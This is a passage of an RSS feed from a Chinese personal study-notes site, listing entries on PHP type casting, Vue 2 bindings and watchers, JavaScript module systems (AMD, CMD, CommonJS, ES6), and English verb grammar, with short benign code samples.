$a = &amp;#39;我是字符串呀&amp;#39;; $b = 123;  // 强制转换，使 a 中的数据变为浮点型 // 但 a 本身的数据并没有变为 float echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;, (float)$a; echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // 0 echo &amp;#39;a = &amp;#39; . $a; //string echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;;  echo &amp;#39;此时 a 的数据类型依旧为：&amp;#39; . gettype($a); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; settype() 设定数据类型，但与前面的强制转换()不同，它会直接改变数据本身。
&amp;lt;?php $a = &amp;#39;我是字符串呀&amp;#39;; $b = 123;  // 强制设置数据类型 //true var_dump(settype($a, &amp;#39;int&amp;#39;)); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // a 的数据类型直接被设置成了 integer，和强制转换大不一样 echo &amp;#39;a 的数据类型为：&amp;#39; .</description>
    </item>
    
    <item>
      <title>Vue Class 与 Style 绑定</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</guid>
      <description>Class 与 Style 绑定 绑定 Class 字符串 适合场景：类名不确定，且需要要动态获取。
对象 适合场景：要绑定多个类名，类名个数确定，类名也确定，但需要动态决定是否要应用样式。
通过修改属性的布尔值来决定是否启用当前样式。
数组 适合场景：要绑定多个类名，类名个数不确定，类名也不确定。
通过向数组中添加元素来增加类名，删除元素来移除类名。
绑定内联样式 对象 CSS 属性名可以用小驼峰式或短横线分隔（用引号括起来）来命名。其中 CSS 属性指是动态值
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  .basic {  width: 100px;  height: 100px;  margin-top: 10px;  border: 1px solid #000;  }   .</description>
    </item>
    
    <item>
      <title>Vue watch</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</guid>
      <description>watch 侦听器，用于侦听 Vue 实例上的数据变动。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt; 	&amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 	&amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt; 	&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt; 	&amp;lt;/head&amp;gt;  	&amp;lt;body&amp;gt; 	&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h2&amp;gt;今天天气很{{weather}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;handoff&amp;#34;&amp;gt;切换天气&amp;lt;/button&amp;gt; 	&amp;lt;h2&amp;gt;{{number.a}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;number.a++&amp;#34;&amp;gt;深度监听a&amp;lt;/button&amp;gt; 	&amp;lt;h2&amp;gt;{{number.b}}&amp;lt;/h2&amp;gt; 	&amp;lt;button @click=&amp;#34;number.b++&amp;#34;&amp;gt;深度监听b&amp;lt;/button&amp;gt; 	&amp;lt;/div&amp;gt; 	&amp;lt;/body&amp;gt; 	&amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;/html&amp;gt; JavaScript
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	isHot: true, 	number: { 	a: 1, 	b: 2, 	}, 	}, 	computed: { 	weather() { 	return this.</description>
    </item>
    
    <item>
      <title>Vue 过滤与排序</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</link>
      <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/%E8%BF%87%E6%BB%A4%E4%B8%8E%E6%8E%92%E5%BA%8F/</guid>
      <description>过滤与排序 当用computed和watch都能实现某一个功能的时候，优先使用computed。
过滤 分别用两种方式实现过滤，computed 与watch，推荐使用前者。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;h1&amp;gt;模糊搜索&amp;lt;/h1&amp;gt; 	&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; placeholder=&amp;#34;请输入名字&amp;#34; v-model=&amp;#34;keyWord&amp;#34; /&amp;gt; 	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;p in filterPersons&amp;#34; :key=&amp;#34;p.id&amp;#34;&amp;gt;{{p.name}}-{{p.age}}-{{p.sex}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
watch 实现
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	keyWord: &amp;#39;&amp;#39;, 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;马冬梅&amp;#39;, age: 20, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;周冬雨&amp;#39;, age: 21, sex: &amp;#39;女&amp;#39; }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;周杰伦 &amp;#39;, age: 22, sex: &amp;#39;男&amp;#39; }, 	{ id: &amp;#39;004&amp;#39;, name: &amp;#39;温兆伦 &amp;#39;, age: 18, sex: &amp;#39;男&amp;#39; }, 	], 	// 用来接受过滤后的结果 	filterPersons: [], 	}, 	methods: {}, 	watch: { 	keyWord: { 	// 初始化 filterPersons 数组 	immediate: true, 	handler(val) { 	// 将过滤后的结果赋给 persons 	this.</description>
    </item>
    
    <item>
      <title>Echarts</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/echarts/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/echarts/</guid>
      <description>Echarts ECharts 是一个使用 JavaScript 实现的开源可视化库，兼容性强，底层依赖矢量图形库 ZRender，提供直观，交互丰富，可高度个性化定制的数据可视化图表。
使用 Echarts 的时候，只需要更改配置项即可。</description>
    </item>
    
    <item>
      <title>English 非谓语动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</guid>
      <description>非谓语动词 谓语动词不能作除谓语以外的句子成分，如果想作除谓语以外的句子成分，只能使用非谓语动词。
以外的所有句子成分和所有从句，从而简化句子，只不过这样的非谓语动词就无法表示时体气等作用了</description>
    </item>
    
    <item>
      <title>jQuery</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/jquery/jquery/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/jquery/jquery/</guid>
      <description>jQuery jQuery 是一个 JavaScript 的类库，jQuery 有的 JavaScript 都有，两者的区别在于用 jQuery 写的代码量更少且功能更大。</description>
    </item>
    
    <item>
      <title>Uniq</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/uniq/uniq/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/uniq/uniq/</guid>
      <description>Uniq ‎ 用于将数组中的所有重复项删除，并按数组中每个元素的首位字符进行升序
安装 npm install uniq 使用
// 导入 uniq var uniq = require(&amp;#39;uniq&amp;#39;); // 定义数组 var arr = [199, 9, 3]; // 排序 var result = uniq(arr); // [ 199, 3, 9 ] // 虽然 199 大于 3 和 9，但因为 199 的首位字符为 1，因此，它排在l console.log(result); </description>
    </item>
    
    <item>
      <title>English 动名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E5%90%8D%E8%AF%8D/</guid>
      <description>动名词 它长得与谓语动词的进行状态一样，用来作主语，由动词 + ing 构成。
动名词和现在分词一样，区别在于现在分词作谓语，动名词不能作谓语。
 She is eating an apple. Eating is importtant. writing diaries. My job is teaching English. My hobby is playing basketball.  动名词用于表示抽象的、多次的、泛指动作。
 His job is selling houses.（多次） Smoking is not good for us.（多次）  can not help + 动名词：忍不住</description>
    </item>
    
    <item>
      <title>English 动词不定式</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E5%AE%9A%E5%BC%8F/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E4%B8%8D%E5%AE%9A%E5%BC%8F/</guid>
      <description>动词不定式 它长得与谓语动词原形一样，由 to + 动词原型构成。其中 to 只是一个符号，用于与谓语动词作区分。可以作主语。
不能单独作谓语。
 To be believe us I want to be beautiful. To work every night. To master English is easy. To get there by bike took me two hours. It is necessary for an adult to learn English grammer. It is kind of you to repair my bike.  通常动词不定式作主语会显得句子头重脚轻，因此，我们可以将句子变化以下，将主语移动到句子后面，前面用一个 it 来充当形式主语：
 To help poor people is our duty. it is our duty to help poor people.</description>
    </item>
    
    <item>
      <title>English 现在分词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E7%8E%B0%E5%9C%A8%E5%88%86%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E7%8E%B0%E5%9C%A8%E5%88%86%E8%AF%8D/</guid>
      <description>现在分词 它长得与谓语动词的进行状态一样。
现在分词必须构成进行时态，且前面必须有助动词。</description>
    </item>
    
    <item>
      <title>English 谓语动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/</guid>
      <description>谓语动词 它是只能作谓语，用于表达动作的时间、状态、语气、否定、可能性、必须性等，但想发挥这些作用，需要用到助动词。</description>
    </item>
    
    <item>
      <title>English 过去分词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%BF%87%E5%8E%BB%E5%88%86%E8%AF%8D/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E8%BF%87%E5%8E%BB%E5%88%86%E8%AF%8D/</guid>
      <description>过去分词 它长得与谓语动词的完成状态一样。</description>
    </item>
    
    <item>
      <title>JavaScrip AMD</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd/</guid>
      <description>AMD 专门用于浏览器端，实现异步加载模块，该规范依赖于 require.js。
不是所有模块都支持 AMD 规范，比如 angular.js，但也可以通过 shim配置来使用angular.js
定义模块 定义没有依赖的模块：
define(function () { 	// 暴露模块 	return module; }); 定义有依赖的模块：
// 显式声明依赖注入 define([&amp;#39;module1&amp;#39;, &amp;#39;module2&amp;#39;, &amp;#39;module2&amp;#39;], function (m1Obj, m2Obj, m3Obj) { 	// 暴露模块 	return module; }); 导入模块 require([ 	&amp;#39;module1&amp;#39;, 	&amp;#39;module2&amp;#39;, 	&amp;#39;module3&amp;#39;, 	function (m1Obj, m2Obj, m3Obj) { 	// 使用 m1Obj, m2Obj, m3Obj 	}, ]); 实现 使用require.js。</description>
    </item>
    
    <item>
      <title>JavaScrip AMD 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/amd/amd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>AMD 实现模块化 将require.js导入到项目目录./libs/require.js
创建项目结构 ./libs/：第三方模块目录。
./modules/：自定义模块目录。
./libs/jquery.js：第三方模块。
./libs/require.js：第三方模块。
./modules/alerter.js：有依赖的自定义模块。
./modules/dataService.js无依赖的自定义模块。
./main.js：主模块。
./index.html：入口文件。
模块化编码 alerter.js
// 定义无依赖的模块 define(function () { 	var name = &amp;#39;no have dependencies&amp;#39;; 	function fun() { 	return name; 	} 	// 暴露模块的 fun() 	return { fun }; }); dataService.js
// 定义有依赖的模块，该模块依赖 dataService、jquery define([&amp;#39;dataService&amp;#39;, &amp;#39;jquery&amp;#39;], function (dataService, $) { 	var msg = &amp;#39;have dependencies&amp;#39;; 	function showMsg() { 	console.log(msg, dataService.fun()); 	} 	$(&amp;#39;body&amp;#39;).</description>
    </item>
    
    <item>
      <title>JavaScrip Browserify 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/browserify-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>Browserify 实现模块化 基于本地浏览器端实现模块化，需要用 Browserify来打包。
创建项目结构 ./dist：打包生成的文件目录。
./src：模块目录。
./src/module1.js：自定义模块一。
./src/module2.js：自定义模块二。
./src/module3.js：自定义模块三。
./app.js：主模块。
./index.html：入口文件。
模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 向暴露 2 个函数，1 个数组  exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd/</guid>
      <description>CMD 专用于浏览器端，异步加载模块。
惰性加载模块，即使用模块时才会加载。
实现该规范使用Sea.js
定义模块 注意，回调函数中的三个参数require, exports, module必须加上，否则会报错。
定义没有依赖的模块：
define(function (require, exports, module) { 	// 暴露模块，通常用后者 	exports.xxx = value; 	module.exports = value; }); 定义有依赖的模块：
define(function (require, exports, module) { 	// 同步导入模块 	var module2 = require(&amp;#39;./module2&amp;#39;); 	// 异步导入依赖模块 	require.async(&amp;#39;./module3&amp;#39;, function (m3Obj) { 	// 使用 m3Obj 	}); 	// 暴露模块 	exports.xxx = value; }); 导入模块 define(function (require) { 	var m1 = require(&amp;#39;.</description>
    </item>
    
    <item>
      <title>JavaScrip CMD 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/cmd/cmd-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>CMD 实现模块化 创建项目结构 ./libs：第三方模块目录。
./libs/sea.js：第三方模块。
./modules：自定义模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./modules/module4.js：自定义模块四。
modules/main.js：主模块。
./index.html：入口文件
模块化编码 module1.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module1&amp;#39;; 	function fun() { 	return msg; 	} 	// 暴露模块 	module.exports = { fun }; }); module2.js
// 定义没有依赖的模块 define(function (require, exports, module) { 	var msg = &amp;#39;module2&amp;#39;; 	function fun2() { 	console.log(msg); 	} 	// 暴露模块 	module.</description>
    </item>
    
    <item>
      <title>JavaScrip CommonJS</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/commonjs/</guid>
      <description>CommonJS 一种为 JS 的表现指定的规范，它希望 JavaScrip 可以运行在任何地方，Node.js采用了这个规范。
一个单独文件就是一个模块，通过require()来同步加载要依赖的模块，然后通过extports或则module.exports来暴露模块的接口。
定义模块 两种方式所暴露的模块都是一个对象。
module.expots 将需要暴露的属性或方法保存到exports对象中。
// ExposedObjects() 将会保存到 exports 对象中，并暴露出去 module.expots = ExposedObjects(){ }; exports.xxx 给exports定义不同的xxx 对象，可以暴露不同属性或方法。
// 不同的对象暴露不同的方法或属性 expots.obj = ExposedObjects(){ }; expots.obj2 = ExposedObjects2(){ } expots.obj3 = ExposedObjects3(){ } 导入模块 // 导入第三方模块 require(&amp;#39;jquery&amp;#39;); // 导入自定义模块 require(&amp;#39;modules.js&amp;#39;); 实现 服务器端 直接使用 Node.js，加载模块时是同步加载，这会导致阻塞（等待），但因为是在服务器端，影响也不是很大，无非是加载的时间比较长。
浏览器端 加载模块时是同步加载，也会导致阻塞，且因为是在浏览器端，加载的时间非常长，用户体验不好（页面白屏），因此，我们需要将模块进行编译打包，以此来缩短加载时间。
打包工具：Browserify.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 Module</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-module/</guid>
      <description>ES6 Module 配置 package.json 项目或模块的描述文件。
{ 	&amp;#34;name&amp;#34;: &amp;#34;es6-module&amp;#34;, 	&amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, 	&amp;#34;dependencies&amp;#34;: { 	&amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34;, 	&amp;#34;uniq&amp;#34;: &amp;#34;^1.0.1&amp;#34; 	}, 	&amp;#34;devDependencies&amp;#34;: { 	&amp;#34;@babel/cli&amp;#34;: &amp;#34;^7.17.10&amp;#34;, 	&amp;#34;@babel/core&amp;#34;: &amp;#34;^7.17.12&amp;#34;, 	&amp;#34;@babel/preset-env&amp;#34;: &amp;#34;^7.17.12&amp;#34;, 	&amp;#34;browserify&amp;#34;: &amp;#34;^17.0.0&amp;#34; 	} } 安装 babel/cli Babel 自带的一个内置的 CLI 命令行工具，可通过命令行编译文件。
npm install --save-dev @babel/core @babel/cli 其中@babel/core是 babel 的核心库。
babel/preset-env 一个智能预设，允许您使用最新的 JavaScript，而无需微观管理目标环境需要哪些语法转换（以及可选的浏览器 polyfills）
npm install --save-dev @babel/preset-env 安装 Browserify 用来打包编译模块。
npm install -g browserify 配置 babel.</description>
    </item>
    
    <item>
      <title>JavaScrip ES6 模块化规范</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/es6-module/es6-%E6%A8%A1%E5%9D%97%E5%8C%96%E8%A7%84%E8%8C%83/</guid>
      <description>ES6 模块化规范 在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。
ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。
依赖模块需要借助 Browserify来打包。
暴露模块 使用export来暴露模块，它用于规定模块的对外接口。
分别暴露 export function fun1() { 	console.log(&amp;#39;fun1 module1&amp;#39;); } export function fun11() { 	console.log(&amp;#39;fun11 module1&amp;#39;); } export var arr = [9999, 34, 5, 6, 7565, 757, 6]; 统一暴露 function fun2() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } function fun22() { 	console.log(&amp;#39;fun2 module2&amp;#39;); } export { fun2, fun22 }; 默认暴露 使用默认暴露，可以暴露任意数据类型；且暴露的是什么数据类型，接收到的就是什么数据类型；可以使用任意的变量来接收。
在同一个模块中，只允许用export default 暴露一次。</description>
    </item>
    
    <item>
      <title>JavaScrip NodeJs 实现模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/commonjs/nodejs-%E5%AE%9E%E7%8E%B0%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>NodeJs 实现模块化 基于node.js服务器端实现模块化。
创建项目结构 ./modules：模块目录。
./modules/module1.js：自定义模块一。
./modules/module2.js：自定义模块二。
./modules/module3.js：自定义模块三。
./app.js：主模块。
安装模块 安装 uniq
npm install uniq 模块化编码 module1.js
// 暴露对象 module.exports = { 	msg: &amp;#39;module one&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; module2.js
// 暴露函数 module.exports = function () { 	console.log(&amp;#39;module two&amp;#39;); }; module3.js
// 暴露 2 个函数，1 个数组 exports.f = function () { 	console.log(&amp;#39;modul three f1&amp;#39;); };  exports.f2 = function () { 	console.log(&amp;#39;module three f2&amp;#39;); };  exports.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97/</guid>
      <description>模块 向外提供特定功能的 JavaScrip 文件，一个 JavaScrip 文件就是一个模块。</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96/</guid>
      <description>模块化 将一个复杂的 JavaScrip 程序依据一定的规范封装成几个块（文件），并组合在一起的过程就是模块化。块的内部数据是私有的，只向外部暴露了一些接口与外部其他模块通信。
作用  降低复杂度。 提高解耦性，降低耦合度。 部署方便，功能点明确。  优点  避免变量污染。 更好的分离，按需加载。 更高的复用性。 更高的可维护性。  常见的模块化标准 CommonJS.
ES6 Module.
AMD.
CMD.</description>
    </item>
    
    <item>
      <title>JavaScrip 模块化的发展史</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%A8%A1%E5%9D%97%E5%8C%96/%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/</guid>
      <description>模块化的发展史 全局函数模式 将不同的函数封装成不同的全局函数。
缺点
变量非常不安全，会直接污染全局中的变量。
JavaScrip One
// msg 变量并不安全，会被其他文件中的 js 代码修改。 var msg = &amp;#39;全局函数模式&amp;#39;; function fun() { 	console.log(msg); } JavaScrip Two
fun(); msg = &amp;#39;全局中的 msg 被其他文件中的 js 代码修改了&amp;#39;; fun(); 命名空间 将全局中的变量定义到一个对象中，以减少 Global 上的变量。
缺点
本质是对象，依旧可以通过对象去修改该对象中的变量，变量依旧不安全。
JavaScrip One
